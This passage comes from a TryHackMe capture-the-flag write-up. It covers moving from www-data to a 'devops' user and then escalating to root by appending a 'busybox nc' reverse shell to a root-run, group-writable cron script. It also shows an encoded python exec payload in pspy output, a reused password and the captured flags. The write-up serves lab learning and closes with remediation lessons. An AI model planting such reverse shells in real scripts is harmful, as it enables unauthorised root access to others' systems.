ubuntu
cd devops
ls
user.txt
cat user.txt
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

We got in via `su` from the existing web shell, not a direct SSH login, but the flag's own name (`s5h_cr3d_r3u53`) implies this credential might work over actual SSH too, given port `22` was open from the very start.

From here on, with `devops` access established, we accessed `/opt/tools/pspy64` to watch what else was running on the box without needing root:

```bash
devops@tryhackme-2404:/opt/tools$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/10/30 13:22:57 CMD: UID=1001  PID=1723   | ./pspy64
2026/10/30 13:22:57 CMD: UID=1001  PID=1701   | bash
2026/10/30 13:22:57 CMD: UID=1001  PID=1690   | (sd-pam)
2026/10/30 13:22:57 CMD: UID=0     PID=1689   |
2026/10/30 13:22:57 CMD: UID=0     PID=1688   |
2026/10/30 13:22:57 CMD: UID=1001  PID=1687   | /usr/lib/systemd/systemd --user
2026/10/30 13:22:57 CMD: UID=0     PID=1675   | su devops
2026/10/30 13:22:57 CMD: UID=33    PID=1667   | /usr/bin/bash -i
2026/10/30 13:22:57 CMD: UID=33    PID=1666   | /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNrNGmtv20bys/grNj4UIhuGsX2HayFUARxbjoUqVho7bVOfQVDUyiJCkSq5iu3D/fib2feSKzvXTxfAErU7O+/XDlNstnXDSN3GpH2ED8YeY7LFj3Zd0oeYrPKKlTGhTVPVsMiaXc7gu7irMlhmtNkU/DAtKW6wdUOzZVHdBQIkEV+h/HU1fTe9vFbn8Wd6dj6L9gL/8mnqga7qZpOVxb9pus3YmoxJmW0Wy4zgrxHIkuBDglD4EKoF+rDNquXXrGk7S7uWNiH+jqIoCIoVqiL5Spu2qKu0qFb1zeEtGY/J8SgYFEJhv+zojpKsJX/iQ0DLlppNscaaR7NU1MFgsVutaJOXWdsCz0WdvH1ktJ3OA/qQ0y0zwFesAQ3CRueIWk80QHB1MZnNYGv4etc2rxdF9XqRtethcDm5Tt9+Ok+vpn9MYPvvxz/888dA4HlP25ZWd7QBgur4UTD4OJGwx8Fg8vvkFE8BwPXHycl7eP5HoH6kp/MzhBu+uBjqtbefrydXsCgcJMmzMm/BQKF1BFQ7mE0u9XE8ndoLL4bkJVELAnYfWgWFOK8/f5hoHG8RqbPCseoVCb4Pr4ZDxBeTk7PJRz97Ls73J7+nH04+z+YnZwAZHpGffiLhj+R7omWIIvKKHMGfIQ8UlnRFUvCwgqVpCCG0ioll8QgMNMDVpKQV4L2sK6pWimq7Y6kAhi3rVBhZp+7Y+hmgDXhDdkf3QQkeJVCYssctjUm6zFjGuYNYASqhWCBvjG8llkoQcNBkRUvJr1m5o5OmqZvwQMOSVZNtKETvY1lnS8LqGgK6uaMj8t0ScMLHAgPlgHxHQkMt9hOLULKGsl1TKetus/xLaIAts8Y29y8thMZKIC0KjdscLhhIZXDvyViRbyhb18tQLiuVrShdSpNqbfUsl9w3BaMhB/Dut5R+CQ8R5+B+XZSUXDc7yvUJmq9qRpSh+doAHtIKCANvRhYTR69I3y8SRsuSu8NggHygWD02MKeHCrmA9WByhdHOIbT7YkwUAsHrYAFYvwQOMhORu6pjNZ0pYp8Qd5R9RdcKowhy9T4GlTb3bAPlKs9ABA4hU7pUi1Kr5lTq0g2fb1emxmlx08H1nDo1ij367KCzhecu/ZSydW6LvWJyEXzRYtSfWmGyD0PUs75Mcc9L4FW+Y7/BY0HLJVEpS8IGT4aZb8/CKgsoVF+abUbe9J0WS/hogRj0DmMUx4p8dCAA0Kk3e0hV0hv7sxm4Gc9QxVIzx90CeOsUBMw3qei+Ojsp3yrr/Ats6P4smcGCKQOSY2RQPqodhE/zsm65/2P+cTjxb6WSD/GDA3a5Qoi4A4BtWbGlhi2X+HkGMbmHutgTJcmRqGg5XR4k5uAKjGoaRwylEWlou60rkbXRWC+JDj4gQx9oHlrsetaRW1zWqeNpejab8F3ZIaUqrlkRnZTUmOEu0m1E2a6LlfFEt+oYJ0iy/M9d0Qglix7VKE07l621nt/x/jbhLbCINQcggeAxaUthtv2zj9z1XuOk1/wpZNgOsLEGjUkFHcP4AJ8xiUE4kldvyAEopaHbRlkwirwUEqjbDeOcrwq4WJSPxliWnhq40mQtDXsVnWu1U47tbK8VATyHkVWsudkNS9x3hTPJlCVS+MDYZQARIQAsz4uNX4qbA5lf8Z5qFNh1gPMMTFa14Vo1RtpdJZyhYTmOENHUnDekm7Y8Ts5hb0ZdyNvI0hIH6eG6Dby4lPptbWl57C7ITggdxnpJylEw3+yFtk+1W0j/NjuGEcugsrR5jaxidUlLGaid06ErLsflldbKjEZYb67eK6tKV8+JqpmAsON8KITSnIBWg6i8XvE82McrHfDgIKFVXi+F43fDw6dMeZC34EEg2BLpOuWdn+zTx92EiQzfd/NevWMYn6Lsx+TYLAlD9fOwaiM4LcwrkuctewRCZ/NP1+n5FFrUOSkqcl8WLeMRhA9Jtt1ic
2026/10/30 13:22:57 CMD: UID=33    PID=1623   | /usr/bin/bash
2026/10/30 13:22:57 CMD: UID=33    PID=1619   | sh -c uname -a; w; id; /bin/sh -i
2026/10/30 13:22:57 CMD: UID=0     PID=1609   |
2026/10/30 13:22:57 CMD: UID=0     PID=1575   |
2026/10/30 13:22:57 CMD: UID=33    PID=1535   | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=0     PID=1478   |
2026/10/30 13:22:57 CMD: UID=0     PID=1277   |
2026/10/30 13:22:57 CMD: UID=0     PID=1276   |
2026/10/30 13:22:57 CMD: UID=0     PID=1275   |
2026/10/30 13:22:57 CMD: UID=0     PID=1274   |
2026/10/30 13:22:57 CMD: UID=0     PID=1228   |
2026/10/30 13:22:57 CMD: UID=0     PID=1129   |
2026/10/30 13:22:57 CMD: UID=0     PID=1117   | /usr/bin/python3 /opt/admin_bot.py
2026/10/30 13:22:57 CMD: UID=115   PID=1070   | /usr/sbin/mysqld
2026/10/30 13:22:57 CMD: UID=0     PID=1024   | /snap/amazon-ssm-agent/13009/ssm-agent-worker
2026/10/30 13:22:57 CMD: UID=33    PID=931    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=930    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=926    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=925    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=33    PID=924    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=0     PID=917    | /usr/sbin/apache2 -k start
2026/10/30 13:22:57 CMD: UID=997   PID=730    | /usr/lib/polkit-1/polkitd --no-debug
2026/10/30 13:22:57 CMD: UID=104   PID=723    | /usr/sbin/rsyslogd -n -iNONE
2026/10/30 13:22:57 CMD: UID=0     PID=708    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
2026/10/30 13:22:57 CMD: UID=0     PID=683    | /sbin/agetty -o -p -- \u --noclear - linux
2026/10/30 13:22:57 CMD: UID=0     PID=665    | /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
2026/10/30 13:22:57 CMD: UID=0     PID=624    | /usr/lib/systemd/systemd-logind
2026/10/30 13:22:57 CMD: UID=0     PID=623    | /usr/lib/snapd/snapd
2026/10/30 13:22:57 CMD: UID=0     PID=618    | /snap/amazon-ssm-agent/13009/amazon-ssm-agent
2026/10/30 13:22:57 CMD: UID=103   PID=606    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2026/10/30 13:22:57 CMD: UID=0     PID=605    | /usr/sbin/cron -f -P
2026/10/30 13:22:57 CMD: UID=0     PID=601    | /usr/sbin/acpid
2026/10/30 13:22:57 CMD: UID=100   PID=544    | /usr/lib/systemd/systemd-networkd
2026/10/30 13:22:57 CMD: UID=102   PID=336    | /usr/lib/systemd/systemd-timesyncd
2026/10/30 13:22:57 CMD: UID=101   PID=333    | /usr/lib/systemd/systemd-resolved
2026/10/30 13:22:57 CMD: UID=0     PID=213    |
2026/10/30 13:22:57 CMD: UID=0     PID=199    |
2026/10/30 13:22:57 CMD: UID=0     PID=185    | /usr/lib/systemd/systemd-udevd
2026/10/30 13:22:57 CMD: UID=0     PID=171    | /sbin/multipathd -d -s
2026/10/30 13:22:57 CMD: UID=0     PID=170    |
2026/10/30 13:22:57 CMD: UID=0     PID=169    |
2026/10/30 13:22:57 CMD: UID=0     PID=123    | /usr/lib/systemd/systemd-journald
2026/10/30 13:22:57 CMD: UID=0     PID=2      |
2026/10/30 13:22:57 CMD: UID=0     PID=1      | /sbin/init
2026/10/30 13:23:01 CMD: UID=0     PID=1734   | /usr/sbin/CRON -f -P
2026/10/30 13:23:01 CMD: UID=0     PID=1735   | /usr/sbin/CRON -f -P
2026/10/30 13:23:01 CMD: UID=0     PID=1736   |
2026/10/30 13:23:01 CMD: UID=0     PID=1737   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1738   |
2026/10/30 13:23:01 CMD: UID=0     PID=1739   |
2026/10/30 13:23:01 CMD: UID=0     PID=1742   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1741   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1740   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:23 CMD: UID=0     PID=1743   |
2026/10/30 13:23:28 CMD: UID=0     PID=1744   | /bin/hostname --fqdn
2026/10/30 13:24:01 CMD: UID=0     PID=1745   | /usr/sbin/CRON -f -P
2026/10/30 13:24:01 CMD: UID=0     PID=1746   | /usr/sbin/CRON -f -P
2026/10/30 13:24:01 CMD: UID=0     PID=1749   | systemctl is-active --quiet apache2
2026/10/30 13:24:01 CMD: UID=0     PID=1747   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1750   | systemctl is-active --quiet mysql
2026/10/30 13:24:01 CMD: UID=0     PID=1752   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1751   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1753   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:24 CMD: UID=0     PID=1754   | ps -e -o pid,ppid,state,command
```

## Privilege Escalation: From a Fully Mapped Path to Root

`pspy64`, run as `devops`, surfaced a root-owned write primitive worth chasing: `/opt/monitoring/health_report.sh`, a monitoring script writable by the `devops` group.

```bash
devops@tryhackme-2404:/opt$ ls -la monitoring/health_report.sh
-rwxrwxr-- 1 root devops 537 ...
```

Writable by the `devops` _group_ (which the `devops` user belongs to), and executed by root. A file root runs but a group we belong to can write to is a privilege-escalation primitive the moment we can find out when (or how often) it actually runs.

We checked everything we could think of for a trigger, and each one is worth recording as a genuine negative result, not just a gap:

| Avenue checked                           | Command                                                     | Result                                                                                                                    |
| ---------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `sudo` rights                            | `echo 'D3v0ps!2024' \| sudo -S -l`                          | Denied: `"user devops may not run sudo on tryhackme-2404"`                                                                |
| SUID binaries                            | `find / -perm -4000 -type f 2>/dev/null`                    | Only stock `/snap/core*/...` binaries, nothing custom                                                                     |
| `cron.hourly` / `cron.daily`             | `ls -la /etc/cron.hourly/ /etc/cron.daily/`                 | `cron.hourly` was just a placeholder; `cron.daily` had only stock package entries, nothing referencing `health_report.sh` |
| `logrotate.d`                            | `cat /etc/logrotate.d/* \| grep -i 'admin\|nexus\|restart'` | Only the stock MySQL entry matched                                                                                        |
| Execution trigger for `health_report.sh` | `systemctl list-timers --all`, cron/logrotate checks above  | No trigger found anywhere _that session_, absent from cron, logrotate, and systemd timers                                 |

We did not find a trigger that session. As a speculative, unverified attempt, a reverse-shell payload was appended to `health_report.sh` (`busybox nc 10.49.120.226 4445 -e sh`) at the end of it, on the reasoning that root ownership implied _some_ execution path even though none was confirmed at the time. No callback was observed before we stopped, so it stayed a parked action rather than a working step, until the next session.

### Finding the Trigger for health_report.sh

Picking the investigation back up, we started by looking at exactly what we'd left on disk:

```bash
devops@tryhackme-2404:/opt$ cat monitoring/health_report.sh
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

A legitimate, unremarkable monitoring script: it checks whether `apache2` and `mysql` are active (`systemctl is-active --quiet`, which produces no output either way, just an exit code) and logs disk usage. Nothing in its own logic mattered.

What mattered was that it's writable by the `devops` group and executed by root, which is exactly what the earlier table above already established, so the reverse-shell line was still sitting at the top of the file from the previous session:

```bash
devops@tryhackme-2404:/opt/monitoring$ cat health_report.sh
#!/bin/bash
# Reverse shell
busybox nc 10.49.120.226 4445 -e sh
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

We ran `pspy64` again to see whether anything actually touched the file, and this time the timestamps weren't all identical the way the first dump's were:

```bash
2026/10/30 13:23:01 CMD: UID=0     PID=1737   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1742   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1741   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:23:01 CMD: UID=0     PID=1740   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1749   | systemctl is-active --quiet apache2
2026/10/30 13:24:01 CMD: UID=0     PID=1747   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1750   | systemctl is-active --quiet mysql
2026/10/30 13:24:01 CMD: UID=0     PID=1752   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1751   | /bin/bash /opt/monitoring/health_report.sh
2026/10/30 13:24:01 CMD: UID=0     PID=1753   | /bin/bash /opt/monitoring/health_report.sh
```

`health_report.sh` running as `UID=0`, twice, exactly 60 seconds apart, each spawned by `/usr/sbin/CRON -f -P`. Unlike the first `pspy64` dump, where every line shared one identical startup timestamp, these genuinely differ, so this was a live, recurring execution, not a snapshot artifact.

A 60-second cadence can only come from a `* * * * *`-style cron entry, something no `cron.hourly`/`cron.daily` directory can produce. We went looking for exactly where it's defined:

```bash
devops@tryhackme-2404:/opt/tools$ cat /etc/crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Only the four standard `run-parts` lines, nothing at one-minute granularity. Next:

```bash
devops@tryhackme-2404:/opt/tools$ ls -la /var/spool/cron/crontabs
ls: cannot open directory '/var/spool/cron/crontabs': Permission denied
devops@tryhackme-2404:/opt/tools$ cat /var/spool/cron/crontabs/root 2>/dev/null
```

Denied outright on the directory listing, and the direct read of `root`'s crontab came back silently empty, almost certainly the same denial, just swallowed by the `2>/dev/null`.

That's actually informative rather than a dead end: a per-user crontab (what `crontab -e` as root would edit) lives exactly there, and it being unreadable to `devops` is consistent with the room not wanting us to just read the answer directly. The one world-readable location left to check was `/etc/cron.d/`:

```bash
devops@tryhackme-2404:/opt/tools$ ls -la /etc/cron.d/
total 32
drwxr-xr-x   2 root root  4096 Apr 29  2026 .
drwxr-xr-x 114 root root 12288 Oct 30 13:02 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root   712 Jan 19  2024 php
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
devops@tryhackme-2404:/opt/tools$ cat /etc/cron.d/*
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
```

Just the stock `e2scrub_all`, PHP session cleanup, and `sysstat` entries, nothing referencing `health_report.sh`. Between the empty-of-anything-relevant `/etc/crontab`, the clean `/etc/cron.d/`, and the permission-denied personal crontab, the conclusion was unavoidable: the job has to be defined in root's own crontab, which we can't read.

We didn't actually need to read it, though; `pspy64` had already shown us the part that mattered, that the script fires every 60 seconds as root regardless of exactly how the entry is written.

With the payload already in place from the previous session, we just had to wait for the next tick:

```bash
└─# python3 penelope.py -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 -> 127.0.0.1 • 10.49.120.226
[+] [New Reverse Shell] => tryhackme-2404 10.49.179.121 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
root@tryhackme-2404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# whoami
root
root@tryhackme-2404:~# pwd
/root
root@tryhackme-2404:~# ls
root.txt  snap
root@tryhackme-2404:~# cat root.txt
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

`uid=0(root)`, confirmed three separate ways (`id`, `whoami`, `pwd`), and the flag read straight out of `/root/root.txt`. That closes the full chain: `www-data` → `devops` → `root`, via `health_report.sh`'s cron-triggered execution.

## Flags Captured

| #    | Flag                                  | How we got it                                                                                                                                           |
| ---- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`   | `notes` field on `/api/users/profile.php?id=1`, via the IDOR, as a plain low-privilege session                                                          |
| 2    | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` | Source of `admin/index.php`, read through the LFI chain with a forged admin JWT                                                                         |
| 3    | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       | `/opt/flag3.txt`, read immediately after landing a shell via the RFI → RCE chain                                                                        |
| 4    | `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`   | `/home/devops/user.txt`, after `su devops` using the reused database password                                                                           |
| root | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        | `/root/root.txt`, after a reverse shell appended to `health_report.sh` fired via its root crontab trigger, caught with a Penelope listener on port 4445 |

## Lessons Learned

1. **One disabled check can be the root cause of an entire chain.**

- The commented-out JWT signature comparison is the single point of failure that made file disclosure, secret leakage, and admin impersonation all possible.
- Fixing that one line collapses most of the attack path, worth remembering when prioritizing remediation, not just when exploiting.

2. **A containment check built for one input shape doesn't automatically cover another.**

- The `realpath()`-style check on `name` was genuinely solid against `../` traversal; it just never considered that the same parameter could also be a URL.
- Path validation logic needs to be designed around the full space of what the parameter can actually contain, not just the attack you're currently thinking about.

3. **Credential reuse here wasn't a one-off mistake, it was a pattern:**

- The same weak password across three web accounts, then a database password reused as a real OS account password.
- Once you see that pattern once, it's worth actively testing for it again rather than treating each reuse as an isolated finding.

4. **Getting the blind-XSS hypothesis wrong taught us more than getting it right would have.**

- The empty-response-against-a-guaranteed-non-empty-page result should have been the moment we questioned the sandboxed-browser theory instead of patching around it.
- We didn't actually catch that in the moment; we only understood it in hindsight once we had the real source.
- Worth remembering: when a "fix" to your hypothesis still doesn't produce the expected result, that's a sign to question the hypothesis itself, not just the payload.

5. **Ownership is not evidence of execution.**

- We spent real time checking cron, logrotate, and systemd timers precisely because `root` owning a writable file tells you nothing about whether anything actually runs it.
- The negative results from that search were just as valuable as a positive one would have been. They told us where _not_ to spend more time, and they're the reason the `health_report.sh` edit was honestly documented as speculative before we had confirmation.

6. **A permission denial can be the answer, not a dead end.**

- `cron.hourly`, `cron.daily`, and `/etc/cron.d` are all world-readable, which is exactly why a schedule meant to stay hidden from `devops` wouldn't be defined there. - Once those came back clean, `ls`-ing `/var/spool/cron/crontabs/` and getting `Permission denied` was itself the confirming signal: root's personal crontab is the one schedule location that's both capable of a `* * * * *` entry and deliberately inaccessible to the account that can otherwise write to the target file.
- We didn't need to read that file to use the primitive, `pspy64`'s timing evidence already told us what mattered.
